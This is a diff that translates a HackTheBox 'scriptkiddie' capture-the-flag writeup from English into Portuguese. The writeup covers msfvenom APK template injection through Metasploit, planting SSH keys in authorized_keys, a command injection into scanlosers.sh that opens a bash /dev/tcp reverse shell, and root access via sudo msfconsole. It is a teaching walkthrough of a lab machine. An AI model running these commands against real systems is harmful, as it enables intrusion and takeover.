@@ -1,33 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>scriptkiddie — htb writeup · chu@antisec</title>
-    <meta name="description" content="htb scriptkiddie writeup (linux): template injection via apk on msfvenom, injection into scanlosers.sh to land pwn and metasploit via sudo for root.">
+    <title>scriptkiddie — writeup htb · chu@antisec</title>
+    <meta name="description" content="writeup htb scriptkiddie (linux): template injection via apk no msfvenom, injeção no scanlosers.sh pra virar pwn e metasploit no sudo pra root. em português.">
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="../styles.css">
-    <link rel="alternate" hreflang="pt-BR" href="../pt/hackthebox/scriptkiddie.html">
-    <link rel="alternate" hreflang="en" href="scriptkiddie.html">
-    <link rel="alternate" hreflang="x-default" href="scriptkiddie.html">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="alternate" hreflang="pt-BR" href="scriptkiddie.html">
+    <link rel="alternate" hreflang="en" href="../../hackthebox/scriptkiddie.html">
+    <link rel="alternate" hreflang="x-default" href="../../hackthebox/scriptkiddie.html">
   </head>
   <body>
-    <a class="skip" href="#main">skip to content</a>
+    <a class="skip" href="#main">pular para o conteúdo</a>
 
     <header class="chrome">
       <div class="wrap chrome-in">
-        <a class="brand" href="../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
-        <nav class="nav" aria-label="main">
+        <a class="brand" href="../../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="principal">
           <ul>
-            <li><a href="../index.html">home</a></li>
-            <li><a href="../research/index.html">research</a></li>
+            <li><a href="../../index.html">início</a></li>
+            <li><a href="../index.html">pesquisa</a></li>
             <li><a href="index.html" aria-current="page">writeups</a></li>
-            <li><a href="../about.html">about</a></li>
-            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">team</a></li>
-            <li class="lang"><a href="../pt/hackthebox/scriptkiddie.html" hreflang="pt-BR" lang="pt-BR" title="versão em português" aria-label="mudar para português"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></a><span class="flag-cur" aria-hidden="true"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></span></li>
+            <li><a href="../about.html">sobre</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">time</a></li>
+            <li class="lang"><span class="flag-cur"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></span><a href="../../hackthebox/scriptkiddie.html" hreflang="en" lang="en" title="read in english" aria-label="switch to english"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></a></li>
           </ul>
         </nav>
       </div>
@@ -44,17 +44,17 @@
         <ul class="meta">
           <li class="chip">date=2025-11-14</li>
           <li class="chip">os=linux</li>
-          <li class="chip">lang=en</li>
+          <li class="chip">lang=pt-br</li>
           <li class="chip chip--phos">status=root</li>
         </ul>
 
         <figure class="fig">
           <a href="https://i.imgur.com/dsiv3vG.png"><img src="https://i.imgur.com/dsiv3vG.png" alt="image" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>scriptkiddie</b> — machine card on hackthebox</figcaption>
+          <figcaption class="fig-cap"><b>scriptkiddie</b> — card da máquina no hackthebox</figcaption>
         </figure>
 
         <p class="cmd"><span class="ps1"><b>chu@antisec</b>:~/htb$</span> cat tools.txt</p>
-        <p><strong>Tools</strong> used:</p>
+        <p><strong>Tools</strong> utilizadas:</p>
         <ul class="chips">
           <li class="chip">nmap</li>
           <li class="chip">metasploit</li>
@@ -96,14 +96,14 @@ IP ID Sequence Generation: All zeros
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
           </div>
 
-          <p>Hitting the http service on port 5000, we find a site of hacker 'tools'... testing some of those fields, the upload one stood out, since it's an <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a> field and there's a known flaw about Template Injection via APK.</p>
+          <p>Acessando o serviço http da porta 5000, nos deparamos com um site de 'tools' hackers... ao testar alguns desses campos, o campo de upload chamou atenção, por ser um campo do <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a> e existir uma falha conhecida sobre Template Injection via APK.</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/aiQqHGN.png"><img src="https://i.imgur.com/aiQqHGN.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>k1d'5 t00l5</b> — site on port 5000</figcaption>
+            <figcaption class="fig-cap"><b>k1d'5 t00l5</b> — site da porta 5000</figcaption>
           </figure>
 
-          <p>So let's look this flaw up in metasploit:</p>
+          <p>Então vamos buscar por essa falha no metasploit:</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/Ur9uW3n.png"><img src="https://i.imgur.com/Ur9uW3n.png" alt="Image" loading="lazy"></a>
@@ -116,18 +116,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 search msfvenom</code></pre>
           </div>
 
-          <p>We look at the required fields of the exploit:</p>
+          <p>Olhamos os campos obrigatórios do exploit:</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/WOxQaQs.png"><img src="https://i.imgur.com/WOxQaQs.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>options</b> — exploit fields</figcaption>
+            <figcaption class="fig-cap"><b>options</b> — campos do exploit</figcaption>
           </figure>
 
-          <p>We set it with our IP and the port we want. After running, the exploit creates an APK file with our payload.</p>
+          <p>Setamos com nosso IP e porta desejada. Após executar o exploit ele criará um arquivo APK com nosso payload.</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/VoktRsV.png"><img src="https://i.imgur.com/VoktRsV.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>lhost/lport</b> — options set</figcaption>
+            <figcaption class="fig-cap"><b>lhost/lport</b> — opções setadas</figcaption>
           </figure>
 
           <div class="code">
@@ -136,18 +136,18 @@ search msfvenom</code></pre>
 set LPORT</code></pre>
           </div>
 
-          <p>Back on the port 5000 site, we set the fields with: 'Android', '10.10.14.219' and pick our file</p>
+          <p>Voltamos ao site da porta 5000 e setamos os campos como: 'Android' , '10.10.14.219' e selecionamos nosso arquivo</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/Q5tmarS.png"><img src="https://i.imgur.com/Q5tmarS.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>upload</b> — apk on the form</figcaption>
+            <figcaption class="fig-cap"><b>upload</b> — apk no formulário</figcaption>
           </figure>
 
-          <p>After clicking generate, the connection lands on our netcat:</p>
+          <p>Após clicar em generate, a conexão chega em nosso netcat:</p>
 
           <figure class="fig">
             <a href="https://i.imgur.com/re79P0M.png"><img src="https://i.imgur.com/re79P0M.png" alt="Image" loading="lazy"></a>
-            <figcaption class="fig-cap"><b>netcat</b> — shell received</figcaption>
+            <figcaption class="fig-cap"><b>netcat</b> — shell recebida</figcaption>
           </figure>
 
           <div class="code">
@@ -155,11 +155,11 @@ set LPORT</code></pre>
             <pre><code>nc -vvnlp 4444</code></pre>
         </div>
 
-        <p>We use python3 to upgrade our shell:</p>
+        <p>Usamos o python3 para melhorar nossa shell:</p>
 
         <figure class="fig">
           <a href="https://i.imgur.com/rSII9HK.png"><img src="https://i.imgur.com/rSII9HK.png" alt="Image" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>pty</b> — interactive shell</figcaption>
+          <figcaption class="fig-cap"><b>pty</b> — shell interativa</figcaption>
         </figure>
 
         <div class="code">
@@ -167,11 +167,11 @@ set LPORT</code></pre>
           <pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
       </div>
 
-      <p>We generate a key on our machine:</p>
+      <p>Geramos uma chave em nossa máquina:</p>
 
       <figure class="fig">
         <a href="https://i.imgur.com/eeXxCBN.png"><img src="https://i.imgur.com/eeXxCBN.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>ssh-keygen</b> — key generated</figcaption>
+        <figcaption class="fig-cap"><b>ssh-keygen</b> — chave gerada</figcaption>
       </figure>
 
       <div class="code">
@@ -179,11 +179,11 @@ set LPORT</code></pre>
         <pre><code>ssh-keygen</code></pre>
     </div>
 
-    <p>We write the RSA key into the authorized_keys file to get an SSH connection.</p>
+    <p>Escrevemos a chave RSA dentro do arquivo authorized_keys para conseguirmos uma conexão SSH.</p>
 
     <figure class="fig">
       <a href="https://i.imgur.com/sCZrZML.png"><img src="https://i.imgur.com/sCZrZML.png" alt="Image" loading="lazy"></a>
-      <figcaption class="fig-cap"><b>authorized_keys</b> — key written</figcaption>
+      <figcaption class="fig-cap"><b>authorized_keys</b> — chave escrita</figcaption>
     </figure>
 
     <div class="code">
@@ -193,11 +193,11 @@ cd .ssh
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCneP1h2E/pSKsdUVMxMJjfdUGZyjTNQhnisB/yG5jVt5uMNZEmKDee60lHtYqNoxgmPLQ/m4RQ4Y7A1nzh4mLz7Qut2h/yxSNNh+6HdChsXwoIunQfRaBM491FpwGa7/6/wp+GeIkGEduw/pDEFG9holYghJUtX/epWjEJT4z7HNufRhAWHAT4DwJThSCStzvmySyyzoRtJXiImY5cSDmwO7Al4mjWRX8IZyjqN+VyuZD1CMTlf52UCqQv9Zxzg4486+I+MCGa6Va9lEQWT6fL780t1rIi+PpsToF8MDpCRWUCGRltNzDbgKVVTyi3uITWrUxDXUlmv9+ykvkf1ENUUQEHazf6eRc35Ghvadikh27pbpzn2AH3DAHln9A0gDHtLATzURVGNiPplW7azhS+ukeoJw7AAb9UP3NX6elacnjaW3fhVu+oV+H2CJ0yxC5pFfea7lq4EkpScYq6lP29+niIiCq5MUPh4ijGkGEZCRL8G+HNRvOXmSRuqmNs6L8= root@antisec" &gt;&gt; authorized_keys</code></pre>
     </div>
 
-    <p>After writing it, we connect over SSH.</p>
+    <p>Depois de escreve-la, fazemos a conexão via SSH.</p>
 
     <figure class="fig">
       <a href="https://i.imgur.com/pqg9EbZ.png"><img src="https://i.imgur.com/pqg9EbZ.png" alt="Image" loading="lazy"></a>
-      <figcaption class="fig-cap"><b>ssh</b> — login as kid</figcaption>
+      <figcaption class="fig-cap"><b>ssh</b> — login como kid</figcaption>
     </figure>
 
     <div class="code">
@@ -205,11 +205,11 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCneP1h2E/pSKsdUVMxMJjfdUGZyjTNQhnisB
       <pre><code>ssh kid@scriptkiddie.htb -i kid</code></pre>
   </div>
 
-  <p>Listing the folders in kid's home, we have a folder called logs</p>
+  <p>Listando as pastas da raiz do usuário kid, temos uma pasta chamada logs</p>
 
   <figure class="fig">
     <a href="https://i.imgur.com/UbfufK8.png"><img src="https://i.imgur.com/UbfufK8.png" alt="Image" loading="lazy"></a>
-    <figcaption class="fig-cap"><b>logs</b> — kid's folder</figcaption>
+    <figcaption class="fig-cap"><b>logs</b> — pasta do usuário kid</figcaption>
   </figure>
 
   <div class="code">
@@ -217,11 +217,11 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCneP1h2E/pSKsdUVMxMJjfdUGZyjTNQhnisB
     <pre><code>ls -la</code></pre>
 </div>
 
-<p>Inside that logs folder, there's a file called hackers that belongs to the 'pwn' group</p>
+<p>Dentro dessa pasta chamada logs, existe um arquivo chamado hackers que faz parte do grupo 'pwn'</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/W5ty0Le.png"><img src="https://i.imgur.com/W5ty0Le.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>hackers</b> — file owned by group pwn</figcaption>
+  <figcaption class="fig-cap"><b>hackers</b> — arquivo do grupo pwn</figcaption>
 </figure>
 
 <div class="code">
@@ -229,11 +229,11 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCneP1h2E/pSKsdUVMxMJjfdUGZyjTNQhnisB
   <pre><code>ls -la</code></pre>
 </div>
 
-<p>In pwn's folder (/home/pwn) there's a bash script called scanlosers.sh that interacts with the hackers file, which we have write permission on.</p>
+<p>Na pasta do usuário pwn (/home/pwn) temos um bash script chamado scanlosers.sh que interage com o arquivo hackers, o qual temos permissão de escrita.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/ktXrPA3.png"><img src="https://i.imgur.com/ktXrPA3.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>scanlosers.sh</b> — pwn's script</figcaption>
+  <figcaption class="fig-cap"><b>scanlosers.sh</b> — script do usuário pwn</figcaption>
 </figure>
 
 <div class="code">
@@ -242,12 +242,12 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCneP1h2E/pSKsdUVMxMJjfdUGZyjTNQhnisB
 cat scanlosers.sh</code></pre>
 </div>
 
-<p>So we use echo to inject a command and break the syntax of scanlosers.sh so a command of ours runs.
-  The script uses 'cut -d ' ' -f3-' so we pass 3 leading spaces and run our command right after.</p>
+<p>Portanto, usamos o echo para inserir um comando e quebrar a syntax do código scanlosers.sh e executar um comando nosso.
+  O script usa o 'cut -d ' ' -f3-' então vamos passar 3 espaçõs iniciais e rodar um comando em seguida.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/W8fDCUs.png"><img src="https://i.imgur.com/W8fDCUs.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>echo</b> — injection into the hackers file</figcaption>
+  <figcaption class="fig-cap"><b>echo</b> — injeção no arquivo hackers</figcaption>
 </figure>
 
 <div class="code">
@@ -256,11 +256,11 @@ cat scanlosers.sh</code></pre>
 echo "  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.219/1337 0&gt;&amp;1' #" &gt;&gt; hackers</code></pre>
 </div>
 
-<p>Doing that, we get the connection already as user pwn :)</p>
+<p>Ao fazer isso, recebemos a conexão já como usuário pwn :)</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/2t9MkbF.png"><img src="https://i.imgur.com/2t9MkbF.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>pwn</b> — shell as pwn</figcaption>
+  <figcaption class="fig-cap"><b>pwn</b> — shell como pwn</figcaption>
 </figure>
 
 <div class="code">
@@ -268,11 +268,11 @@ echo "  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.219/1337 0&gt;&amp;1'
   <pre><code>nc -vvnlp 1337</code></pre>
 </div>
 
-<p>We list whether we're allowed to run any program as root, and there's metasploit (lol)</p>
+<p>Listamos se temos permissão pra user algum programa com permissão de root, e temos o metasploit (lol)</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/a4gOhX0.png"><img src="https://i.imgur.com/a4gOhX0.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>sudo -l</b> — metasploit allowed</figcaption>
+  <figcaption class="fig-cap"><b>sudo -l</b> — metasploit liberado</figcaption>
 </figure>
 
 <div class="code">
@@ -280,12 +280,12 @@ echo "  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.219/1337 0&gt;&amp;1'
   <pre><code>sudo -l</code></pre>
 </div>
 
-<p>Metasploit lets you run shell commands even from inside the framework :)
-  We generate the key on our machine:</p>
+<p>O Metasploit permite executar comando shell mesmo dentro do framework :)
+  Geramos a chave em nossa máquina:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/JLVx2yJ.png"><img src="https://i.imgur.com/JLVx2yJ.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>ssh-keygen</b> — second key</figcaption>
+  <figcaption class="fig-cap"><b>ssh-keygen</b> — segunda chave</figcaption>
 </figure>
 
 <div class="code">
@@ -293,11 +293,11 @@ echo "  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.219/1337 0&gt;&amp;1'
   <pre><code>ssh-keygen</code></pre>
 </div>
 
-<p>And then we write an RSA key into the /root/.ssh/authorized_keys file</p>
+<p>E então, vamos escrever uma chave RSA no arquivo /root/.ssh/authorized_keys</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/Rw4kvD9.png"><img src="https://i.imgur.com/Rw4kvD9.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>msfconsole</b> — echo into root's authorized_keys</figcaption>
+  <figcaption class="fig-cap"><b>msfconsole</b> — echo no authorized_keys do root</figcaption>
 </figure>
 
 <div class="code">
@@ -305,11 +305,11 @@ echo "  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.219/1337 0&gt;&amp;1'
   <pre><code>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDahIdVfE+PSXj1pXUKgyl1srULxOZ8tczHrsxKW5OjWV8MtKTHLW0sGoYxT+d/vxS0/KaCVdLPYjbDXJ7+758TIHWi+km7Tx1UOnj+F0fuQhc3Kw51n+dc7CSMMGOWGS16cJj9VWjFklj8T0cLoOUzbT7If7Xn4Cwz0OzLth+heqqCFBQQjHrQj+5jFlGIQycu5BmbCuuu3Eh5rBArgrF2XMDXUkAZjARczjhIPzTM1MW7wKCAok+gS3u0Epry8ULEwJjhiXAXbCLGivInit7GU8Smk/JnmGkY4ZerJqNL4FsGlhjLgi9Bu9QnFF0ZPXLFQsL9M5oH7vN75ZS6KIno8D8naZT2eoK97zq4DE8q9FqOEWV/b2FNxTZgn3Mf/M8xbq0r/WQ/p4+66Ch7ypbyKKXOVSGgwh9wedZyzTwn/waU6lex0DD96RTwmxm7t2mVGTasMhdVVK+v9H7XhfiyEG6lKZIK2c6CNsbJ2Mzo43YaBylKyG0YRpwCNSxdgB0= root@antisec" &gt;&gt; /root/.ssh/authorized_keys</code></pre>
 </div>
 
-<p>Now we use the key and we are r00t :~</p>
+<p>Agora usamos a chave e we are r00t :~</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/Rw1wh5f.png"><img src="https://i.imgur.com/Rw1wh5f.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>root</b> — ssh as root</figcaption>
+  <figcaption class="fig-cap"><b>root</b> — ssh como root</figcaption>
 </figure>
 
 <div class="code">
@@ -346,10 +346,10 @@ echo "  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.219/1337 0&gt;&amp;1'
       <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
     </div>
     <div class="foot-row">
-      <p>© 2026 chu · <a href="../index.html">home</a> · <a href="index.html">writeups</a> · <a href="../about.html#contact">contact</a></p>
+      <p>© 2026 chu · <a href="../../index.html">início</a> · <a href="index.html">writeups</a> · <a href="../about.html#contact">contato</a></p>
     </div>
   </div>
 </footer>
-<script src="../zoom.js" defer></script>
+<script src="../../zoom.js" defer></script>
 </body>
 </html>
